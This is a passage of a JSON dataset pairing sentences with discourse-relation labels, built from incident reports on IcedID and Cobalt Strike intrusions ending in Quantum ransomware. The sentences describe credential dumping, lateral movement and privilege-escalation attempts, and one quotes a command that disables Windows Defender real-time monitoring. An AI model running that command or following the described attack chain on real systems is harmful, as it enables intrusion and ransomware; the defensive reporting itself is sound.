        "S2": "This appeared to fail so the threat actor then opened cmd and proceeded to execute a PowerShell Cobalt Strike Beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "This appeared to fail so the threat actor then opened cmd and proceeded to execute a PowerShell Cobalt Strike Beacon.",
        "S2": "This Beacon was successful in connecting to the same command and control server observed on the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "This Beacon was successful in connecting to the same command and control server observed on the beachhead host.",
        "S2": "For the next hour, the threat actor proceeded to make RDP connections to other servers in the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "For the next hour, the threat actor proceeded to make RDP connections to other servers in the environment.",
        "S2": "Once the threat actor had a handle on the layout of the domain, they prepared to deploy the ransomware by copying the ransomware (named ttsel.exe ) to each host through the C$ share folder.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the threat actor had a handle on the layout of the domain, they prepared to deploy the ransomware by copying the ransomware (named ttsel.exe ) to each host through the C$ share folder.",
        "S2": "They used two methods of remote execution to detonate the ransomware binary, WMI and PsExec.",
        "relation": "NEXT"
    },
    {
        "S1": "They used two methods of remote execution to detonate the ransomware binary, WMI and PsExec.",
        "S2": "This ransomware deployment concluded less than four hours from the initial IcedID execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This ransomware deployment concluded less than four hours from the initial IcedID execution.",
        "S2": "While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "S2": "The threat actor gained initial access through the common malware, IcedID.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor gained initial access through the common malware, IcedID.",
        "S2": "The payload was delivered within an ISO file, docs_invoice_173.iso , via email, where a user opened and executed the malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The payload was delivered within an ISO file, docs_invoice_173.iso , via email, where a user opened and executed the malware.",
        "S2": "Shout out to @k3dg3 for making these ISOs available.",
        "relation": "MISC"
    },
    {
        "S1": "Shout out to @k3dg3 for making these ISOs available.",
        "S2": "We were able to determine the user mounted the ISO using the Event ID 12 in Microsoft-Windows-VHDMP-Operational.evtx as shown below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We were able to determine the user mounted the ISO using the Event ID 12 in Microsoft-Windows-VHDMP-Operational.evtx as shown below:",
        "S2": "When mounted, the ISO contained two files:",
        "relation": "NEXT"
    },
    {
        "S1": "When mounted, the ISO contained two files:",
        "S2": "Typical end user perspective after opening the ISO file:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Typical end user perspective after opening the ISO file:",
        "S2": "The file document.lnk is a shortcut or lnk file and dar.dll was the IcedID payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The file document.lnk is a shortcut or lnk file and dar.dll was the IcedID payload.",
        "S2": "A quick look at document.lnk \u2018s properties highlight the command line that is executed on launch:",
        "relation": "ELABORATION"
    },
    {
        "S1": "A quick look at document.lnk \u2018s properties highlight the command line that is executed on launch:",
        "S2": "But we can do a lot better than that with a .lnk file!",
        "relation": "ELABORATION"
    },
    {
        "S1": "But we can do a lot better than that with a .lnk file!",
        "S2": "These .lnk files provide a wealth of knowledge to investigators.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These .lnk files provide a wealth of knowledge to investigators.",
        "S2": "For example, below is a partial output of the tool LECmd.exe (by Eric Zimmerman).",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, below is a partial output of the tool LECmd.exe (by Eric Zimmerman).",
        "S2": "When used on the file document.lnk , it parses out metadata such as when the shortcut file was made, what hostname and the MAC Address of the device it was created on and even the directory path of the user that created it!",
        "relation": "ELABORATION"
    },
    {
        "S1": "When used on the file document.lnk , it parses out metadata such as when the shortcut file was made, what hostname and the MAC Address of the device it was created on and even the directory path of the user that created it!",
        "S2": "We were able to determine when the user clicked on the lnk file and when a new process was created with the command line mentioned above.",
        "relation": "NEXT"
    },
    {
        "S1": "We were able to determine when the user clicked on the lnk file and when a new process was created with the command line mentioned above.",
        "S2": "Furthermore, the Event ID 4663 in Security.evtx highlighted when explorer.exe accessed document.lnk :",
        "relation": "ELABORATION"
    },
    {
        "S1": "Furthermore, the Event ID 4663 in Security.evtx highlighted when explorer.exe accessed document.lnk :",
        "S2": "Additionally, the context of execution location and parent process can also be used to follow the user execution process.",
        "relation": "MISC"
    },
    {
        "S1": "Additionally, the context of execution location and parent process can also be used to follow the user execution process.",
        "S2": "Shortly after execution of the payload, several child processes were spawned that created persistence and began discovery on the host.",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly after execution of the payload, several child processes were spawned that created persistence and began discovery on the host.",
        "S2": "This included an instance of C:\\Windows\\SysWOW64\\cmd.exe , which the IcedID malware used to hollow out and then inject a Cobalt Strike beacon into.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This included an instance of C:\\Windows\\SysWOW64\\cmd.exe , which the IcedID malware used to hollow out and then inject a Cobalt Strike beacon into.",
        "S2": "There were several additional indications of Cobalt Strike we observed to verify it was utilized by the threat actor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "There were several additional indications of Cobalt Strike we observed to verify it was utilized by the threat actor.",
        "S2": "The cmd.exe process spawned a suspicious instance of rundll32.exe .",
        "relation": "MISC"
    },
    {
        "S1": "The cmd.exe process spawned a suspicious instance of rundll32.exe .",
        "S2": "There were no command line arguments for this process which is atypical for rundll32.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "There were no command line arguments for this process which is atypical for rundll32.exe.",
        "S2": "A further indication was the rundll32.exe process creating a named pipe, postex_304a.",
        "relation": "NEXT"
    },
    {
        "S1": "A further indication was the rundll32.exe process creating a named pipe, postex_304a.",
        "S2": "This behavior of rundll32.exe and a named pipe that matches postex_[0-9a-f]{4} , is the default behavior used by Cobalt Strike 4.2+ post exploitation jobs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This behavior of rundll32.exe and a named pipe that matches postex_[0-9a-f]{4} , is the default behavior used by Cobalt Strike 4.2+ post exploitation jobs.",
        "S2": "For more information on Cobalt Strike, you can read our article Cobalt Strike, a Defender\u2019s Guide.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For more information on Cobalt Strike, you can read our article Cobalt Strike, a Defender\u2019s Guide.",
        "S2": "When we reviewed the memory of this process, we were able to confirm it was in fact Cobalt Strike when we successfully extracted the beacon configuration (additional details can be found in the Command and Control section).",
        "relation": "MISC"
    },
    {
        "S1": "When we reviewed the memory of this process, we were able to confirm it was in fact Cobalt Strike when we successfully extracted the beacon configuration (additional details can be found in the Command and Control section).",
        "S2": "The threat actor also executed a PowerShell Cobalt Strike payload on some servers:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor also executed a PowerShell Cobalt Strike payload on some servers:",
        "S2": "This payload is using the default Cobalt Strike obfuscation scheme (XOR 35), and can easily be decoded using CyberChef:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This payload is using the default Cobalt Strike obfuscation scheme (XOR 35), and can easily be decoded using CyberChef:",
        "S2": "The output can be analyzed using scdbg to highlight what Windows API calls the shellcode makes:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The output can be analyzed using scdbg to highlight what Windows API calls the shellcode makes:",
        "S2": "Prior to using the PowerShell beacon the threat actor dropped a DLL beacon on the server (p227.dll), but this appears to have failed for unknown reasons after which, the threat actor moved on to the PowerShell beacon which executed successfully.",
        "relation": "MISC"
    },
    {
        "S1": "Prior to using the PowerShell beacon the threat actor dropped a DLL beacon on the server (p227.dll), but this appears to have failed for unknown reasons after which, the threat actor moved on to the PowerShell beacon which executed successfully.",
        "S2": "After the initial execution of the IcedID malware, it established persistence by creating a copy of the malware (Ulfefi32.dll) in the AppData directory of the affected user and created a scheduled task to execute it every hour.",
        "relation": "MISC"
    },
    {
        "S1": "After the initial execution of the IcedID malware, it established persistence by creating a copy of the malware (Ulfefi32.dll) in the AppData directory of the affected user and created a scheduled task to execute it every hour.",
        "S2": "The task \\kajeavmeva_{B8C1A6A8-541E-8280-8C9A-74DF5295B61A} was created with the execution action below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The task \\kajeavmeva_{B8C1A6A8-541E-8280-8C9A-74DF5295B61A} was created with the execution action below:",
        "S2": "Process injection was observed during the intrusion by both IcedID and Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "Process injection was observed during the intrusion by both IcedID and Cobalt Strike.",
        "S2": "On one system, the threat actor injected into the winlogon process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On one system, the threat actor injected into the winlogon process.",
        "S2": "Cobalt Strike Processes Identified by in Memory Yara Scanning.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Cobalt Strike Processes Identified by in Memory Yara Scanning.",
        "S2": "Volatility Malfind output shows the embedded MZ header in the winlogon process with the setting PAGE_EXECUTE_READWRITE protection settings on the memory space, a commonly observed attribute of process injection.",
        "relation": "MISC"
    },
    {
        "S1": "Volatility Malfind output shows the embedded MZ header in the winlogon process with the setting PAGE_EXECUTE_READWRITE protection settings on the memory space, a commonly observed attribute of process injection.",
        "S2": "Network connections to the Cobalt Strike server by winlogon were also observed in the process logs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Network connections to the Cobalt Strike server by winlogon were also observed in the process logs.",
        "S2": "Suspicious accesses to LSASS process memory were observed during this intrusion.",
        "relation": "LIST"
    },
    {
        "S1": "Suspicious accesses to LSASS process memory were observed during this intrusion.",
        "S2": "As illustrated below, those accesses have been made using both Windows Task Manager and rundll32.exe which is assessed to be a Cobalt Strike temporary beacon (as shown in the Execution graph):",
        "relation": "ELABORATION"
    },
    {
        "S1": "As illustrated below, those accesses have been made using both Windows Task Manager and rundll32.exe which is assessed to be a Cobalt Strike temporary beacon (as shown in the Execution graph):",
        "S2": "The threat actors managed to steal administrator account credentials, allowing them to move laterally across the Active Directory domain.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors managed to steal administrator account credentials, allowing them to move laterally across the Active Directory domain.",
        "S2": "As mentioned in the Execution section, the IcedID process ran several initial discovery commands that provided environmental information about the host, network, and domain, to the threat actor.",
        "relation": "MISC"
    },
    {
        "S1": "As mentioned in the Execution section, the IcedID process ran several initial discovery commands that provided environmental information about the host, network, and domain, to the threat actor.",
        "S2": "Given the timing of these commands were immediately after the execution of IcedID, we believe these commands were executed automatically upon check-in.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Given the timing of these commands were immediately after the execution of IcedID, we believe these commands were executed automatically upon check-in.",
        "S2": "A cmd.exe process spawned from IcedID which ran additional discovery queries.",
        "relation": "MISC"
    },
    {
        "S1": "A cmd.exe process spawned from IcedID which ran additional discovery queries.",
        "S2": "The threat actor dropped the following files in C:\\Windows\\Temp directory:",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor dropped the following files in C:\\Windows\\Temp directory:",
        "S2": "The actor used the Active Directory enumeration tool AdFind to collect information such as the users, computers and subnets in the domain.",
        "relation": "NEXT"
    },
    {
        "S1": "The actor used the Active Directory enumeration tool AdFind to collect information such as the users, computers and subnets in the domain.",
        "S2": "The file ad.7z , was the resulting output of the AdFind commands above.",
        "relation": "NEXT"
    },
    {
        "S1": "The file ad.7z , was the resulting output of the AdFind commands above.",
        "S2": "After that, an additional batch script was created, ns.bat , which enumerated all host names in the domain with nslookup to identify the IP address of the host.",
        "relation": "NEXT"
    },
    {
        "S1": "After that, an additional batch script was created, ns.bat , which enumerated all host names in the domain with nslookup to identify the IP address of the host.",
        "S2": "Prior to the first lateral movement from the beachhead host, the threat actor tested credentials and gathered information from their targeted remote server using WMI",
        "relation": "NEXT"
    },
    {
        "S1": "Prior to the first lateral movement from the beachhead host, the threat actor tested credentials and gathered information from their targeted remote server using WMI",
        "S2": "The threat actor used RDP to move laterally to critical hosts.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor used RDP to move laterally to critical hosts.",
        "S2": "In particular, we have evidence on multiple machines of RDP using the Administrator account.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In particular, we have evidence on multiple machines of RDP using the Administrator account.",
        "S2": "The attacker in this intrusion initiated RDP connections from a workstation, named TERZITERZI.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker in this intrusion initiated RDP connections from a workstation, named TERZITERZI.",
        "S2": "See the screenshot below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "See the screenshot below:",
        "S2": "The RDP connections were established from the Cobalt Strike process running the beacon indicating the threat actor utilizing proxy on the beachhead host to facilitate the RDP traffic.:",
        "relation": "MISC"
    },
    {
        "S1": "The RDP connections were established from the Cobalt Strike process running the beacon indicating the threat actor utilizing proxy on the beachhead host to facilitate the RDP traffic.:",
        "S2": "PsExec was used to facilitate the ransomware execution.",
        "relation": "NEXT"
    },
    {
        "S1": "PsExec was used to facilitate the ransomware execution.",
        "S2": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name ( mstdc ) of the remote service created on the target host (by default it\u2019s PSEXESVC).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name ( mstdc ) of the remote service created on the target host (by default it\u2019s PSEXESVC).",
        "S2": "Through-out the intrusion the threat actor was also observed using WMIC to perform lateral activities including discovery actions remotely, and as a second option, to ensure all the remote hosts successfully executed the final ransomware payload.",
        "relation": "MISC"
    },
    {
        "S1": "Through-out the intrusion the threat actor was also observed using WMIC to perform lateral activities including discovery actions remotely, and as a second option, to ensure all the remote hosts successfully executed the final ransomware payload.",
        "S2": "The WMIC commands prefaced with /node:IP Address allowed the threat actor to run commands on remote hosts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The WMIC commands prefaced with /node:IP Address allowed the threat actor to run commands on remote hosts.",
        "S2": "As we saw from the execution section, dar.dll was used to contact the below domains:",
        "relation": "MISC"
    },
    {
        "S1": "As we saw from the execution section, dar.dll was used to contact the below domains:",
        "S2": "While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "relation": "MISC"
    },
    {
        "S1": "While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "S2": "Just shy of four hours into the intrusion, the threat actors began acting on their final objectives, domain wide ransomware deployment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Just shy of four hours into the intrusion, the threat actors began acting on their final objectives, domain wide ransomware deployment.",
        "S2": "With their pivot point from one of the domain controllers, the actor used a combination of both PsExec and WMI to remotely execute the ransomware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "With their pivot point from one of the domain controllers, the actor used a combination of both PsExec and WMI to remotely execute the ransomware.",
        "S2": "They first copied the payload, ttsel.exe , to the C$ share of each host on the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They first copied the payload, ttsel.exe , to the C$ share of each host on the network.",
        "S2": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name (\u201cmstdc\u201d) of the remote service created on the target host (by default is PSEXESVC).",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor utilized the \u201c-r\u201d option in PsExec to define a custom name (\u201cmstdc\u201d) of the remote service created on the target host (by default is PSEXESVC).",
        "S2": "This resulted in the file C:\\Windows\\mstdc.exe being created on the target endpoint when PsExec was executed.",
        "relation": "NEXT"
    },
    {
        "S1": "This resulted in the file C:\\Windows\\mstdc.exe being created on the target endpoint when PsExec was executed.",
        "S2": "The alternate execution method the actor employed was a WMI call to start a remote process on the target host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The alternate execution method the actor employed was a WMI call to start a remote process on the target host.",
        "S2": "The Quantum ransomware began to encrypt files across all hosts in the environment which then dropped the following ransom note: README_TO_DECRYPT.html",
        "relation": "NEXT"
    },
    {
        "S1": "The Quantum ransomware began to encrypt files across all hosts in the environment which then dropped the following ransom note: README_TO_DECRYPT.html",
        "S2": "The Quantum portal had a unique option to create and set a password to the negotiation chat.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Quantum portal had a unique option to create and set a password to the negotiation chat.",
        "S2": "Once authenticated, it displays the chat window with the threat actor.",
        "relation": "NEXT"
    },
    {
        "S1": "We assess with high confidence that the \u201cStolen Image Evidence\u201d email campaign was used to deliver the IcedID DLL.",
        "S2": "This was first reported by Microsoft in April 2021.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was first reported by Microsoft in April 2021.",
        "S2": "Upon execution of the IcedID DLL, a connection to a C2 server was established.",
        "relation": "MISC"
    },
    {
        "S1": "Upon execution of the IcedID DLL, a connection to a C2 server was established.",
        "S2": "This was followed by the creation of a scheduled task on the beachhead host to establish persistence.",
        "relation": "NEXT"
    },
    {
        "S1": "This was followed by the creation of a scheduled task on the beachhead host to establish persistence.",
        "S2": "The task executed the IcedID payload every one 1 hour.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The task executed the IcedID payload every one 1 hour.",
        "S2": "The IcedID malware then used Windows utilities such as net, chcp, nltest, and wmic, to perform discovery activity on the host.",
        "relation": "NEXT"
    },
    {
        "S1": "The IcedID malware then used Windows utilities such as net, chcp, nltest, and wmic, to perform discovery activity on the host.",
        "S2": "After a gap of almost an hour, a Cobalt Strike beacon was dropped and executed on the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "After a gap of almost an hour, a Cobalt Strike beacon was dropped and executed on the beachhead host.",
        "S2": "Soon after, another round of discovery was performed from the Cobalt Strike beacon focusing on the Windows domain.",
        "relation": "NEXT"
    },
    {
        "S1": "Soon after, another round of discovery was performed from the Cobalt Strike beacon focusing on the Windows domain.",
        "S2": "Nltest and net group were utilized to look for sensitive groups such as Domain Admins and Enterprise Admins.",
        "relation": "NEXT"
    },
    {
        "S1": "Nltest and net group were utilized to look for sensitive groups such as Domain Admins and Enterprise Admins.",
        "S2": "Process injection into explorer.exe was then observed from the Cobalt Strike Beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "Process injection into explorer.exe was then observed from the Cobalt Strike Beacon.",
        "S2": "The threat actors proceeded to install remote management tools such as Atera Agent and Splashtop.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors proceeded to install remote management tools such as Atera Agent and Splashtop.",
        "S2": "Use of these 3rd party administrative tools allow the threat actors another \u201clegitimate\u201d means of persistence and access if they were to lose their malware connection.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Use of these 3rd party administrative tools allow the threat actors another \u201clegitimate\u201d means of persistence and access if they were to lose their malware connection.",
        "S2": "In this intrusion, we observed usage of gmail[.]com and outlook[.]com email accounts for Atera agent registration.",
        "relation": "MISC"
    },
    {
        "S1": "In this intrusion, we observed usage of gmail[.]com and outlook[.]com email accounts for Atera agent registration.",
        "S2": "Soon after, one of the injected Cobalt Strike processes accessed LSASS memory to dump credentials from the beachhead.",
        "relation": "NEXT"
    },
    {
        "S1": "Soon after, one of the injected Cobalt Strike processes accessed LSASS memory to dump credentials from the beachhead.",
        "S2": "On the sixth day of the intrusion, the beachhead host saw new discovery activity with a quick nltest followed by the PowerView script Invoke-ShareFinder.",
        "relation": "NEXT"
    },
    {
        "S1": "On the sixth day of the intrusion, the beachhead host saw new discovery activity with a quick nltest followed by the PowerView script Invoke-ShareFinder.",
        "S2": "On the following day, the seventh day of the intrusion, the threat actors made their next move.",
        "relation": "NEXT"
    },
    {
        "S1": "On the following day, the seventh day of the intrusion, the threat actors made their next move.",
        "S2": "On that day, a new Cobalt Strike server was observed, in fact over the course of the intrusion, four different Cobalt Strike servers were used.",
        "relation": "NEXT"
    },
    {
        "S1": "On that day, a new Cobalt Strike server was observed, in fact over the course of the intrusion, four different Cobalt Strike servers were used.",
        "S2": "From the beachhead host, a DLL was transferred to a domain controller over SMB and then a remote service was created on the domain controller to execute the Cobalt Strike DLL.",
        "relation": "NEXT"
    },
    {
        "S1": "From the beachhead host, a DLL was transferred to a domain controller over SMB and then a remote service was created on the domain controller to execute the Cobalt Strike DLL.",
        "S2": "After getting a foothold on the domain controller, we saw more process injection followed by the same pattern of installing Atera for additional persistent access.",
        "relation": "NEXT"
    },
    {
        "S1": "After getting a foothold on the domain controller, we saw more process injection followed by the same pattern of installing Atera for additional persistent access.",
        "S2": "From the domain controller, the threat actors proceeded with more discovery tasks including AdFind and Invoke-ShareFinder again.",
        "relation": "NEXT"
    },
    {
        "S1": "From the domain controller, the threat actors proceeded with more discovery tasks including AdFind and Invoke-ShareFinder again.",
        "S2": "After this, the threat actors went quiet.",
        "relation": "NEXT"
    },
    {
        "S1": "After this, the threat actors went quiet.",
        "S2": "On day nine of the intrusion, the next Cobalt Strike server, which would ultimately be used until the end of the intrusion, was observed for the first time.",
        "relation": "NEXT"
    },
    {
        "S1": "On day nine of the intrusion, the next Cobalt Strike server, which would ultimately be used until the end of the intrusion, was observed for the first time.",
        "S2": "On the tenth day, little activity was observed but the threat actors connected to the beachhead host via the Atera agent and executed another Cobalt Strike DLL.",
        "relation": "NEXT"
    },
    {
        "S1": "On the tenth day, little activity was observed but the threat actors connected to the beachhead host via the Atera agent and executed another Cobalt Strike DLL.",
        "S2": "A little discovery check-in was observed on the 14th day, but little else.",
        "relation": "NEXT"
    },
    {
        "S1": "A little discovery check-in was observed on the 14th day, but little else.",
        "S2": "On the 19th day, the threat actors moved towards their final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "On the 19th day, the threat actors moved towards their final objectives.",
        "S2": "They reviewed the directory structure of several hosts including domain controllers and backup servers.",
        "relation": "NEXT"
    },
    {
        "S1": "They reviewed the directory structure of several hosts including domain controllers and backup servers.",
        "S2": "They then dropped their final ransomware payload on the beachhead host and attempted to execute it using a batch file named backup.bat.",
        "relation": "NEXT"
    },
    {
        "S1": "They then dropped their final ransomware payload on the beachhead host and attempted to execute it using a batch file named backup.bat.",
        "S2": "However, they found that their execution failed.",
        "relation": "NEXT"
    },
    {
        "S1": "However, they found that their execution failed.",
        "S2": "They left for a few hours, and then returned, and attempted to exploit a couple of CVE\u2019s in an attempt to escalate privileges.",
        "relation": "NEXT"
    },
    {
        "S1": "They left for a few hours, and then returned, and attempted to exploit a couple of CVE\u2019s in an attempt to escalate privileges.",
        "S2": "The threat actors had already secured domain admin access but it\u2019s possible the operator may have thought they lacked permissions when their first ransomware execution failed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors had already secured domain admin access but it\u2019s possible the operator may have thought they lacked permissions when their first ransomware execution failed.",
        "S2": "While these exploits appear to have failed the threat actors found their previously captured domain admin credentials and launched two new Cobalt Strike beacons on the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "While these exploits appear to have failed the threat actors found their previously captured domain admin credentials and launched two new Cobalt Strike beacons on the domain controllers.",
        "S2": "Finally, twenty minutes after accessing the domain controllers, the threat actors dropped the ransomware DLL and the batch script and executed it from the domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "Finally, twenty minutes after accessing the domain controllers, the threat actors dropped the ransomware DLL and the batch script and executed it from the domain controller.",
        "S2": "This time the execution worked as intended and resulted in domain wide ransomware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This time the execution worked as intended and resulted in domain wide ransomware.",
        "S2": "The IcedID DLL, which gave the threat actors a foothold into the environment, was likely delivered by a \u201cStolen Image Evidence\u201d email campaign.",
        "relation": "MISC"
    },
    {
        "S1": "The IcedID DLL, which gave the threat actors a foothold into the environment, was likely delivered by a \u201cStolen Image Evidence\u201d email campaign.",
        "S2": "These initial access campaigns reportedly utilize contact forms to send malicious emails to intended targets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These initial access campaigns reportedly utilize contact forms to send malicious emails to intended targets.",
        "S2": "The emails contain a link to a legitimate storage service like those offered by Google and Microsoft.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The emails contain a link to a legitimate storage service like those offered by Google and Microsoft.",
        "S2": "In this example, \u201chttp://storage.googleapis.com\u201d was used to host a zip file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this example, \u201chttp://storage.googleapis.com\u201d was used to host a zip file.",
        "S2": "The zip archive contains an ISO file, which once clicked and mounted, shows a document-like LNK file.",
        "relation": "MISC"
    },
    {
        "S1": "The zip archive contains an ISO file, which once clicked and mounted, shows a document-like LNK file.",
        "S2": "Once the victim opens that LNK file, the IcedID DLL loader executes, downloads, and runs the second stage of IcedID.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the victim opens that LNK file, the IcedID DLL loader executes, downloads, and runs the second stage of IcedID.",
        "S2": "Below is a configuration extraction of that initial IcedID malware from an automated sandbox analysis of the sample:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below is a configuration extraction of that initial IcedID malware from an automated sandbox analysis of the sample:",
        "S2": "The graph below shows detailed actions performed through IcedID, including reconnaissance and Cobalt Strike beacons drops:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The graph below shows detailed actions performed through IcedID, including reconnaissance and Cobalt Strike beacons drops:",
        "S2": "Only one scheduled task was created during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Only one scheduled task was created during this intrusion.",
        "S2": "The scheduled task was created on the beachhead host upon the execution of IcedID DLL, which executed every hour:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The scheduled task was created on the beachhead host upon the execution of IcedID DLL, which executed every hour:",
        "S2": "Threat actors dropped and installed Atera agent (T1219), using two MSI packages \u201csql.msi\u201d and \u201cmstsc.msi\u201d, from the Cobalt Strike beacons, which allowed them to have a non-malware backdoor in the environment.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors dropped and installed Atera agent (T1219), using two MSI packages \u201csql.msi\u201d and \u201cmstsc.msi\u201d, from the Cobalt Strike beacons, which allowed them to have a non-malware backdoor in the environment.",
        "S2": "The installation of those two packages reveals two emails potentially belonging to the ransomware operators or affiliates:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The installation of those two packages reveals two emails potentially belonging to the ransomware operators or affiliates:",
        "S2": "Atera agent is a remote monitoring and management system.",
        "relation": "MISC"
    },
    {
        "S1": "Atera agent is a remote monitoring and management system.",
        "S2": "At one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At one point in the intrusion the threat actors utilized Atera to download and launch a new Cobalt Strike beacon on one of the hosts they had installed the agent on.",
        "S2": "There were attempts to exploit Active Directory vulnerabilities CVE-2021-42278 and CVE-2021-42287 in order to create privileged accounts.",
        "relation": "MISC"
    },
    {
        "S1": "There were attempts to exploit Active Directory vulnerabilities CVE-2021-42278 and CVE-2021-42287 in order to create privileged accounts.",
        "S2": "This attempt failed, however, there were indicators through DNS requests enumerating accounts for the existence of SAMTHEADMIN-XX (XX being a random number).",
        "relation": "ELABORATION"
    },
    {
        "S1": "This attempt failed, however, there were indicators through DNS requests enumerating accounts for the existence of SAMTHEADMIN-XX (XX being a random number).",
        "S2": "The query status 9003 indicates that this does not exist.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The query status 9003 indicates that this does not exist.",
        "S2": "The injected process dllhost.exe requesting SAMTHEADMIN-92 and SAMTHEADMIN-20 accounts:",
        "relation": "MISC"
    },
    {
        "S1": "The injected process dllhost.exe requesting SAMTHEADMIN-92 and SAMTHEADMIN-20 accounts:",
        "S2": "We believe the operator used the publicly available script \u2018sam_the_admin\u2018 or a variant based on it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We believe the operator used the publicly available script \u2018sam_the_admin\u2018 or a variant based on it.",
        "S2": "Part of the script generates a new computer name account in the form SAMTHEADMIN- followed by a random value between 0 to 100, as indicated below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Part of the script generates a new computer name account in the form SAMTHEADMIN- followed by a random value between 0 to 100, as indicated below.",
        "S2": "The exploitation involves invoking lookups to ensure that the new accounts were successful, explaining why failed DNS requests were observed.",
        "relation": "MISC"
    },
    {
        "S1": "The exploitation involves invoking lookups to ensure that the new accounts were successful, explaining why failed DNS requests were observed.",
        "S2": "A base64 encoded PowerShell command was executed on the beachhead which disabled Windows Defender AV (T1562.001).",
        "relation": "MISC"
    },
    {
        "S1": "A base64 encoded PowerShell command was executed on the beachhead which disabled Windows Defender AV (T1562.001).",
        "S2": "The decoded base64 PowerShell command uses Set-MpPreference cmdlet to disable Defender\u2019s real time monitoring: Set-MpPreference -DisableRealtimeMonitoring $true",
        "relation": "NEXT"
    },
    {
        "S1": "The decoded base64 PowerShell command uses Set-MpPreference cmdlet to disable Defender\u2019s real time monitoring: Set-MpPreference -DisableRealtimeMonitoring $true",
        "S2": "A number of process injections were seen during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "A number of process injections were seen during this intrusion.",
        "S2": "The Cobalt Strike beacon used the CreateRemoteThread Win32 function in order to inject code into running processes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Cobalt Strike beacon used the CreateRemoteThread Win32 function in order to inject code into running processes.",
        "S2": "The usage of this function triggers the Sysmon Event ID 8, a well known pattern of CS beacon activity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The usage of this function triggers the Sysmon Event ID 8, a well known pattern of CS beacon activity.",
        "S2": "Remote threads were created in Winlogon and Explorer processes.",
        "relation": "MISC"
    },
    {
        "S1": "Remote threads were created in Winlogon and Explorer processes.",
        "S2": "The threat actors accessed LSASS process memory (T1003.001) on different hosts, including domain controllers, using multiple techniques.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors accessed LSASS process memory (T1003.001) on different hosts, including domain controllers, using multiple techniques.",
        "S2": "The screenshot below shows the different \u201cDesiredAccess\u201d to the LSASS process object from different beacons (dllhost.exe, Edebef4.dll, etc.) or Task Manager:",
